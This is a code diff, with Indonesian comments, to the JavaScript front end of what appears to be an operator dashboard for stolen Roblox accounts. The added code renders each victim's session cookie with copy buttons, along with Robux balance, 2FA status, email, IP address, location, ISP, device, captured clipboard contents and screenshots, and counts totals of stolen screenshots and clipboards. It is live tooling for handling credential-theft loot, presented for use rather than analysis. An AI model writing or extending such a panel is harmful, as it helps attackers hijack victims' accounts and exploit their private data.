@@ -186,7 +186,155 @@ function copyCookie(cookie) {
 function openProfile(userId) {
     window.open(`https://www.roblox.com/users/${userId}/profile`, '_blank');
 }
+// ============================================
+// FUNGSI UNTUK SCREENSHOT
+// ============================================
+let currentScreenshotAccountId = null;
 
+function viewScreenshot(userId) {
+    const account = allAccounts.find(a => String(a.userId) === String(userId));
+    if (!account || !account.screenshot) {
+        alert('No screenshot available for this account.');
+        return;
+    }
+    currentScreenshotAccountId = userId;
+    document.getElementById('screenshotImage').src = account.screenshot;
+    document.getElementById('screenshotModal').classList.add('visible');
+}
+
+function closeScreenshotModal() {
+    document.getElementById('screenshotModal').classList.remove('visible');
+    currentScreenshotAccountId = null;
+}
+
+function downloadScreenshot() {
+    const img = document.getElementById('screenshotImage');
+    if (!img.src) return;
+    const link = document.createElement('a');
+    link.download = `screenshot_${currentScreenshotAccountId || Date.now()}.jpg`;
+    link.href = img.src;
+    link.click();
+}
+
+// ============================================
+// FUNGSI COPY TEXT (Clipboard)
+// ============================================
+function copyText(text) {
+    if (!text) {
+        alert('Nothing to copy');
+        return;
+    }
+    navigator.clipboard.writeText(text).then(() => {
+        alert('✅ Copied to clipboard!');
+    }).catch(() => {
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand('copy');
+        document.body.removeChild(ta);
+        alert('✅ Copied!');
+    });
+}
+
+// ============================================
+// PERBAIKI RENDER ACCOUNTS (tambahkan data IP, screenshot, clipboard)
+// ============================================
+function renderAccounts(accounts) {
+    const grid = document.getElementById('accountsGrid');
+    const filtered = applyFilter(accounts);
+
+    if (!filtered || filtered.length === 0) {
+        grid.innerHTML = `<div class="loading" style="grid-column:1/-1;">📭 No accounts</div>`;
+        return;
+    }
+
+    grid.innerHTML = filtered.map(account => `
+        <div class="account-card">
+            <span class="badge ${account.premium ? 'badge-premium' : 'badge-free'}">
+                ${account.premium ? '⭐ PREMIUM' : 'FREE'}
+            </span>
+            ${account.twoFAEnabled ? '<span class="badge badge-2fa">🔒 2FA</span>' : ''}
+
+            <div class="username">${account.displayName || account.username || 'Unknown'}</div>
+            <div class="user-id">🆔 ${account.userId || 'N/A'}</div>
+
+            <div class="info-grid">
+                <div class="info-item">
+                    <span class="label">💰 Robux</span>
+                    <span class="value">${(account.robux || 0).toLocaleString()} R$</span>
+                </div>
+                <div class="info-item">
+                    <span class="label">👥 Friends</span>
+                    <span class="value">${account.friends || 0}</span>
+                </div>
+                <div class="info-item">
+                    <span class="label">📅 Age</span>
+                    <span class="value">${account.accountAge || 'N/A'}</span>
+                </div>
+                <div class="info-item">
+                    <span class="label">📧 Email</span>
+                    <span class="value">${account.emailVerified ? '✅' : '❌'} ${account.email || 'N/A'}</span>
+                </div>
+            </div>
+
+            <!-- IP & Location -->
+            <div class="ip-location">
+                <div style="display:flex; justify-content:space-between; font-size:12px; color:var(--text-secondary);">
+                    <span>🌐 IP: <strong style="color:var(--text-primary);">${account.ip || 'Unknown'}</strong></span>
+                    <span>📍 ${account.location?.country || 'Unknown'}, ${account.location?.city || ''}</span>
+                </div>
+                <div style="font-size:11px; color:var(--text-muted); margin-top:4px;">
+                    ${account.location?.isp || 'ISP Unknown'} · ${account.device?.platform || 'Device Unknown'}
+                </div>
+            </div>
+
+            <!-- Clipboard -->
+            ${account.clipboard?.hasData ? `
+                <div style="margin-top:10px; background:rgba(255,255,255,0.03); border-radius:var(--radius-sm); padding:6px 10px; font-size:12px; color:var(--text-secondary);">
+                    📋 Clipboard: <span style="color:var(--text-primary);">${account.clipboard.text.substring(0, 80)}${account.clipboard.text.length > 80 ? '...' : ''}</span>
+                    <button class="copy-btn" onclick="copyText('${(account.clipboard.text || '').replace(/'/g, "\\'")}')" style="background:none; border:none; color:var(--accent-cyan); cursor:pointer; margin-left:6px;">Copy</button>
+                </div>
+            ` : ''}
+
+            <!-- Screenshot -->
+            ${account.screenshot ? `
+                <div style="margin-top:10px;">
+                    <button class="btn-screenshot" onclick="viewScreenshot('${account.userId}')">🖼️ View Screenshot</button>
+                </div>
+            ` : ''}
+
+            <!-- Cookie & Actions -->
+            <div class="cookie-box" style="margin-top:12px;">
+                <textarea readonly rows="2">${account.cookie || 'No cookie'}</textarea>
+                <button class="copy-btn" onclick="copyCookie('${(account.cookie || '').replace(/'/g, "\\'")}')">📋 Copy</button>
+            </div>
+            <div class="actions">
+                <button class="btn-profile" onclick="openProfile('${account.userId}')">👤 Profile</button>
+                <button class="btn-delete" onclick="deleteAccount('${account.userId}')">🗑️ Delete</button>
+            </div>
+        </div>
+    `).join('');
+
+    // Refresh Lucide icons jika ada
+    if (typeof lucide !== 'undefined') lucide.createIcons();
+}
+
+// ============================================
+// UPDATE STATS (tambahkan total screenshot, dll)
+// ============================================
+function updateStats(stats, accounts) {
+    document.getElementById('totalAccounts').textContent = stats?.totalAccounts || accounts.length || 0;
+    document.getElementById('totalRobux').textContent = (stats?.totalRobux || 0).toLocaleString();
+    const premiumCount = (accounts || []).filter(a => a.premium).length;
+    document.getElementById('premiumCount').textContent = premiumCount;
+
+    // Tambahan: total screenshot & clipboard
+    const totalScreenshots = (accounts || []).filter(a => a.screenshot).length;
+    const totalClipboards = (accounts || []).filter(a => a.clipboard?.hasData).length;
+    document.getElementById('totalScreenshots').textContent = totalScreenshots;
+    document.getElementById('totalClipboards').textContent = totalClipboards;
+}
 // Delete account
 async function deleteAccount(userId) {
     if (confirm('⚠️ Are you sure you want to delete this account?')) {
